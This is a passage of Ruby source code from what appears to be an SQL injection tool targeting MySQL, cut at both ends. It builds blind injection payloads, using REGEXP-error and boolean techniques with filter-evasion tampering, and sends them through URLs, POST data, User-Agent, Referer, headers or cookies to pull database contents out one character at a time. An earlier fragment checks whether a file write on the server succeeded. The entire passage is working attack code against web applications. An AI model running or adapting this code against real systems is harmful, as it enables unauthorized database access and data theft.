            $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
          end
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          if turn_off
            $config['HTTP']['HTTP_HEADERS_ADD'] = false
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].delete(k)
          end
        when 'COOKIE'
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
          end
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          if turn_off
            $config['HTTP']['HTTP_HEADERS_ADD'] = false
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].delete(k)
          end
        end
        if res[1] == 200 and not res[0] =~ /Can't create\/write to file|File '.+' already exists|Errcode: 28|ErrCode 28|Error 28|Errcode: 122|ErrCode 122|Error 122|Errcode: 17|ErrCode 17|Error 17|Errcode: 13|ErrCode 13|Error 13|error in your SQL syntax/i
          print_good("Signs seem to indicate things went OK......")
          break
        elsif res[0] =~ /Can't create\/write to file|File '.+' already exists|Errcode: 28|ErrCode 28|Error 28|Errcode: 122|ErrCode 122|Error 122|Errcode: 17|ErrCode 17|Error 17|Errcode: 13|ErrCode 13|Error 13|error in your SQL syntax/i
          print_error("Signs indicate there is a problem writing to this location...")
        else
          print_caution("Signs are unclear - Unknown Status....")
        end
      end
      break
    end
  end

  # Make basic injection request
  # Pass in query and fetch results...
  # Returns results or nil if nothing found
  def blind_basic_inject(query)
    # Make sure data exists before wasting time...
    if not data_exists(query)
      print_error("Doesn't appear any data exists!")
      print_error("Might be privleges or value is NULL, idk....")
      print_error("Double check manually to be 100% sure....\n\n")
      return nil
    end

    # Run injection now...
    case $config['INJECTOR']['MYSQL']['BLIND']['METHOD']
    when 'REGXP'
      r=rand(10000)
      inj = " aNd 1=(sELecT #{r} REGEXP #{r})"
      t=@tweak.tamper(inj)
      t2=@tweak.space(t)
      injection_str=@tweak.comma(t2)
      case $config['INJECTOR']['MYSQL']['LOC']
      when 'URL'
        if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
          injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.get(injection)
        else # POST
          injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.post(injection_url, injection_data)
        end
      when 'UA'
        original_ua = $config['HTTP']['HTTP_USER_AGENT']
        $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['HTTP_USER_AGENT'] = original_ua
      when 'REF'
        original_ref = $config['HTTP']['REFERER']
        $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['REFERER'] = original_ref
      when 'HEADER'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      when 'COOKIE'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      end
      @true = res[0]

      zcount = 10
      while(true)
        inj = " and 1=(SELECT 1 REGEXP IF((select length(#{query})<#{zcount}),1,''))"
        t = @tweak.tamper(inj)
        t2 = @tweak.space(t)
        injection_str = @tweak.comma(t2)
        case $config['INJECTOR']['MYSQL']['LOC']
        when 'URL'
          if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
            injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
            res = @http.get(injection)
          else # POST
            injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
            injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
            res = @http.post(injection_url, injection_data)
          end
        when 'UA'
          original_ua = $config['HTTP']['HTTP_USER_AGENT']
          $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          $config['HTTP']['HTTP_USER_AGENT'] = original_ua
        when 'REF'
          original_ref = $config['HTTP']['REFERER']
          $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          $config['HTTP']['REFERER'] = original_ref
        when 'HEADER'
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
          end
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          if turn_off
            $config['HTTP']['HTTP_HEADERS_ADD'] = false
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].delete(k)
          end
        when 'COOKIE'
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
          end
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          if turn_off
            $config['HTTP']['HTTP_HEADERS_ADD'] = false
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].delete(k)
          end
        end
        if res[0] == @true
          if zcount.to_i <= 10
            starts = 0
          elsif zcount.to_i > 10 and zcount.to_i < 100
            starts = (zcount.to_i - 10)
          elsif zcount.to_i >= 100 and zcount.to_i < 1000
            starts = (zcount.to_i - 50)
          elsif zcount.to_i >= 1000 and zcount.to_i < 100000
            starts = (zcount.to_i - 100)
          end
          ends = zcount.to_i
          break
        else
          if zcount.to_i < 100
            zcount = zcount.to_i + 10
          elsif zcount.to_i >= 100 and zcount.to_i < 1000
            zcount = zcount.to_i + 50
          elsif zcount.to_i >= 1000 and zcount.to_i < 1000000
            zcount = zcount.to_i + 100
          end
          if zcount.to_i > 1000000
            @fail=true
            print_error("Length > 1000000!")
            print_error("Too much to extract blind!")
            return nil
          end
        end
      end

      reallength = 0
      baselength = starts.to_i
      while baselength.to_i < 1000000
        inj = " aNd 1=(SELECT 1 REGEXP "
        inj += "IF((SELECT length((#{query})))=#{baselength.to_i},'',"
        inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 1},'(',"
        inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 2},'[',"
        inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 3},'\\\\\\\\',"
        inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 4},'*',"
        inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 5},'a{1,1,1}',"
        inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 6},'[a-9]',"
        inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 7},'a{1',"
        inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 8},'[[.ab.]]',"
        inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 9},'[[:ab:]]',1)))))))))))"
        t = @tweak.tamper(inj)
        t2 = @tweak.space(t)
        injection_str = @tweak.comma(t2)
        case $config['INJECTOR']['MYSQL']['LOC']
        when 'URL'
          if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
            injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
            res = @http.get(injection)
          else # POST
            injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
            injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
            res = @http.post(injection_url, injection_data)
          end
        when 'UA'
          original_ua = $config['HTTP']['HTTP_USER_AGENT']
          $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          $config['HTTP']['HTTP_USER_AGENT'] = original_ua
        when 'REF'
          original_ref = $config['HTTP']['REFERER']
          $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          $config['HTTP']['REFERER'] = original_ref
        when 'HEADER'
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
          end
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          if turn_off
            $config['HTTP']['HTTP_HEADERS_ADD'] = false
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].delete(k)
          end
        when 'COOKIE'
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
          end
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          if turn_off
            $config['HTTP']['HTTP_HEADERS_ADD'] = false
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].delete(k)
          end
        end
        if res[0] =~ /empty \(sub\)expression/
          reallength = baselength.to_i
          break
        elsif res[0] =~ /parentheses not balanced/
          reallength = baselength.to_i + 1
          break
        elsif res[0] =~ /brackets \(\[ \]\) not balanced/
          reallength = baselength.to_i + 2
          break
        elsif res[0] =~ /trailing backslash \(\\\)/
          reallength = baselength.to_i + 3
          break
        elsif res[0] =~ /repetition-operator operand invalid/
          reallength = baselength.to_i + 4
          break
        elsif res[0] =~ /invalid repetition count\(s\)/
          reallength = baselength.to_i + 5
          break
        elsif res[0] =~ /invalid character range/
          reallength = baselength.to_i + 6
          break
        elsif res[0] =~ /braces not balanced/
          reallength = baselength.to_i + 7
          break
        elsif res[0] =~ /invalid collating element/
          reallength = baselength.to_i + 8
          break
        elsif res[0] =~ /invalid character class/
          reallength = baselength.to_i + 9
          break
        end
        baselength = baselength.to_i + 10
      end
      if reallength.nil? or reallength.to_i == 0
        print_error("Unable to properly determine length, flying super blind....")
        reallength = baselength.to_i
      end

puts "***DEBUG***".light_red + " length: #{reallength}".light_cyan

      # Now we go get the actual result!using length
      char_position = 1
      results = String.new
      while char_position.to_i < (reallength.to_i + 1)
        # Determine ascii range of target char
        inj = " aNd 1=(SELECT 1 REGEXP "
        inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<31,'', "
        inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<52,'(', "
        inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<73,'[', "
        inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<94,'\\\\\\\\',"
        inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<115,'*', "
        inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<136,'a{1,1,1}', "
        inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<157,'[a-9]', "
        inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<178,'a{1', "
        inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<199,'[[.ab.]]', "
        inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<230,'[[:ab:]]',1)))))))))))"
        t = @tweak.tamper(inj)
        t2 = @tweak.space(t)
        injection_str = @tweak.comma(t2)
        case $config['INJECTOR']['MYSQL']['LOC']
        when 'URL'
          if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
            injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
            res = @http.get(injection)
          else # POST
            injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
            injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
            res = @http.post(injection_url, injection_data)
          end
        when 'UA'
          original_ua = $config['HTTP']['HTTP_USER_AGENT']
          $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          $config['HTTP']['HTTP_USER_AGENT'] = original_ua
        when 'REF'
          original_ref = $config['HTTP']['REFERER']
          $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          $config['HTTP']['REFERER'] = original_ref
        when 'HEADER'
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
          end
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          if turn_off
            $config['HTTP']['HTTP_HEADERS_ADD'] = false
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].delete(k)
          end
        when 'COOKIE'
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
          end
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          if turn_off
            $config['HTTP']['HTTP_HEADERS_ADD'] = false
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].delete(k)
          end
        end
        if res[0] =~ /empty \(sub\)expression/
          starts = 0
          ends = 30
        elsif res[0] =~ /parentheses not balanced/
          starts = 31
          ends = 51
        elsif res[0] =~ /brackets \(\[ \]\) not balanced/
          starts = 52
          ends = 72
        elsif res[0] =~ /trailing backslash \(\\\)/
          starts = 73
          ends = 93
        elsif res[0] =~ /repetition-operator operand invalid/
          starts = 94
          ends = 114
        elsif res[0] =~ /invalid repetition count\(s\)/
          starts = 115
          ends = 135
        elsif res[0] =~ /invalid character range/
          starts = 136
          ends = 156
        elsif res[0] =~ /braces not balanced/
          starts = 157
          ends = 177
        elsif res[0] =~ /invalid collating element/
          starts = 178
          ends = 198
        elsif res[0] =~ /invalid character class/
          starts = 199
          ends = 229
        elsif res[0] == @true
          starts = 230
          ends = 255
        end

        char = ''
        ticker = starts.to_i
        while ticker.to_i < 260
          # Determine actual ascii value for target char
          # Thi should take no more than 4 requests :)
          inj = " aNd 1=(SELECT 1 REGEXP "
          inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker},'', "
          inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 1},'(', "
          inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 2},'[', "
          inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 3},'\\\\\\\\',"
          inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 4},'*', "
          inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 5},'a{1,1,1}', "
          inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 6},'[a-9]', "
          inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 7},'a{1', "
          inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 8},'[[.ab.]]', "
          inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 9},'[[:ab:]]',1)))))))))))"
          t = @tweak.tamper(inj)
          t2 = @tweak.space(t)
          injection_str = @tweak.comma(t2)
          case $config['INJECTOR']['MYSQL']['LOC']
          when 'URL'
            if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
              injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
              res = @http.get(injection)
            else # POST
              injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
              injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
              res = @http.post(injection_url, injection_data)
            end
          when 'UA'
            original_ua = $config['HTTP']['HTTP_USER_AGENT']
            $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            $config['HTTP']['HTTP_USER_AGENT'] = original_ua
          when 'REF'
            original_ref = $config['HTTP']['REFERER']
            $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            $config['HTTP']['REFERER'] = original_ref
          when 'HEADER'
            if not $config['HTTP']['HTTP_HEADERS_ADD']
              turn_off=true
              $config['HTTP']['HTTP_HEADERS_ADD'] = true
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
            end
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            if turn_off
              $config['HTTP']['HTTP_HEADERS_ADD'] = false
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].delete(k)
            end
          when 'COOKIE'
            if not $config['HTTP']['HTTP_HEADERS_ADD']
              turn_off=true
              $config['HTTP']['HTTP_HEADERS_ADD'] = true
            end
            $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
            end
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            if turn_off
              $config['HTTP']['HTTP_HEADERS_ADD'] = false
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].delete(k)
            end
          end
          if res[0] =~ /empty \(sub\)expression/
            char = ticker.to_i
            break
          elsif res[0] =~ /parentheses not balanced/
            char = (ticker.to_i + 1)
            break
          elsif res[0] =~ /brackets \(\[ \]\) not balanced/
            char = (ticker.to_i + 2)
            break
          elsif res[0] =~ /trailing backslash \(\\\)/
            char = (ticker.to_i + 3)
            break
          elsif res[0] =~ /repetition-operator operand invalid/
            char = (ticker.to_i + 4)
            break
          elsif res[0] =~ /invalid repetition count\(s\)/
            char = (ticker.to_i + 5)
            break
          elsif res[0] =~ /invalid character range/
            char = (ticker.to_i + 6)
            break
          elsif res[0] =~ /braces not balanced/
            char = (ticker.to_i + 7)
            break
          elsif res[0] =~ /invalid collating element/
            char = (ticker.to_i + 8)
            break
          elsif res[0] =~ /invalid character class/
            char = (ticker.to_i + 9)
            break
          end
          ticker = ticker.to_i + 10
        end
        if char.nil? or char == ''
          ticker = ticker.to_i - 20
          print "\r#{results}".cyan + "?".white
          results += "?" # Fix for when issues
# I cant get this right, idk? Needs to redo on failures (shit just happens irl), but not all cause this can cause a loop...
#          redo unless ticker.to_i < (starts.to_i - 11)
        else
          print "\r#{results}".cyan + "#{char.chr}".white
          results += char.chr
        end
        char_position = char_position.to_i + 1
      end
      puts "\n"
      if results.nil? or results == ''
        return nil
      else
        return results
      end
    when 'BOOLEAN'
      r = rand(10000)
      sqli_true = " aNd #{r}=#{r}"
      t = @tweak.tamper(sqli_true)
      t2 = @tweak.space(t)
      injection_str = @tweak.comma(t2)
      case $config['INJECTOR']['MYSQL']['LOC']
      when 'URL'
        if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
          injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.get(injection)
        else # POST
          injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.post(injection_url, injection_data)
        end
      when 'UA'
        original_ua = $config['HTTP']['HTTP_USER_AGENT']
        $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['HTTP_USER_AGENT'] = original_ua
      when 'REF'
        original_ref = $config['HTTP']['REFERER']
        $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['REFERER'] = original_ref
      when 'HEADER'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      when 'COOKIE'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      end
      @true = res[0]
      @fail=false

      # Find out how long our result is before doing anything
      inj = " aNd (SeLeCT leNgTh((#{query}))<0)"
      t = @tweak.tamper(inj)
      t2 = @tweak.space(t)
      injection_str = @tweak.comma(t2)
      case $config['INJECTOR']['MYSQL']['LOC']
      when 'URL'
        if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
          injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.get(injection)
        else # POST
          injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.post(injection_url, injection_data)
        end
      when 'UA'
        original_ua = $config['HTTP']['HTTP_USER_AGENT']
